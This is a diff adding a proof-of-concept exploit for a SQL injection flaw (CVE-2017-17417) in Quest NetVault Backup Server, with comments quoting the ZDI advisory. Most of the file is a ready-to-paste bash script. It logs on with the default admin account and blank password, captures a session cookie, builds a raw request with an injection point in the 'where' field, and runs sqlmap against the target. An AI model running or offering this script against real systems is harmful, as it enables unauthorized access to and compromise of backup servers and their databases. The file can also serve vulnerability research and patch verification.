@@ -1,0 +1,50 @@
+# Exploit Title: Quest NetVault Backup Server < 11.4.5 Process Manager Service SQL Injection Remote Code Execution Vulnerability (ZDI-17-982)
+# Date: 2-21-2019
+# Exploit Author: credit goes to rgod for finding the bug
+# Version: Quest NetVault Backup Server < 11.4.5
+# CVE : CVE-2017-17417
+
+# There is a decent description of the bug here: https://www.zerodayinitiative.com/advisories/ZDI-17-982/ 
+# but no PoC, hence this submission. Also the description states that authentication is not required.
+# I did not find the auth bypass, but the target was using default credz
+# of admin and a blank password.
+#
+# "This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations 
+# of Quest NetVault Backup. Authentication is not required to exploit this vulnerability.
+# 
+# The specific flaw exists within the handling of NVBUPhaseStatus Acknowledge method requests. 
+# The issue results from the lack of proper validation of a
+# user-supplied string before using it to construct SQL queries. An attacker can leverage this 
+# vulnerability to execute code in the context of the underlying database."
+
+
+
+# Fill out the variables then copy paste everything below this line into a kali terminal
+
+#target ip address
+target=x.x.x.x
+
+#target port
+port=8443
+
+#username
+username=admin
+
+#password is blank by default!
+password=
+cookie=$(curl -i -s -k  -X $'POST' -H $'Content-Length: 109' -H $'Content-Type: application/json-rpc; charset=UTF-8' --data-binary "{\"jsonrpc\":\"2.0\",\"method\":\"Logon\",\"params\":{\"OutputFormat\":\"pretty\",\"UserName\":\"$username\",\"Password\":\"$password\"},\"id\":1}" "https://$target:$port/query" | grep SessionCookie | cut -d '"' -f4)
+cat > dellSqlmap <<EOF
+POST /query HTTP/1.1
+Host: $target:$port
+Connection: close
+Content-Length: 129
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+SessionCookie: $cookie
+Content-Type: application/json-rpc; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"jsonrpc":"2.0","method":"GET","params":{"classname":"NVBUPhaseStatus","updates":"none","where":"1=1*"},"id":1}
+EOF
+sqlmap -r dellSqlmap --force-ssl --level=5 --dbms=postgresql --prefix='' --suffix='' --test-filter='AND boolean-based blind - WHERE or HAVING clause' --batch
